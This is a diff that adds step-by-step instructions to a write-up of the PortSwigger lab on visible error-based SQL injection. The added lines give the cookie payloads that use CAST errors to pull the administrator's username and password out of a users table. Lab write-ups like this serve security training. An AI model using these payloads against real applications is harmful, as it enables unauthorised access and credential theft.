@@ -76,5 +76,22 @@ First, we need to see the behavior after modify cookie. Go to login page
 
 Here is my cookie: `b2enCQjhRAqpl6Zl`.
 
+Firstly, modify your cookie: `b2enCQjhRAqpl6Zl' and cast((select 1) as int) --`
+
+`CAST` to convert your data to any type you want (`int` for integer). You will get error message: `argument of AND must be type boolean, not type integer`.
+
+Make it boolean by adding 1= before cast: `b2enCQjhRAqpl6Zl' and 1=cast((select 1) as int) --`
+
+There is no more error. Now check `username` column in `users` table: `b2enCQjhRAqpl6Zl' and 1=cast((select username from users) as int) --`
+
+Now your query appears to be truncated due to a character limit. Delete your original cookie: `'and 1=cast((select username from users) as int) --`
+
+You get next error: `more than one row returned by a subquery used as an expression`. Fix it: `'and 1=cast((select username from users limit 1) as int) --`
+
+Now you get error with the important value: `invalid input syntax for type integer: "administrator"`
+
+Change `username` to `password`: `'and 1=cast((select password from users limit 1) as int) --`
+
+You can get the password of administrator now! ` invalid input syntax for type integer: "0aq0xu05kj3we8izn4zp"`
 
 **Source:** [Lab: Visible error-based SQL injection](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based#)
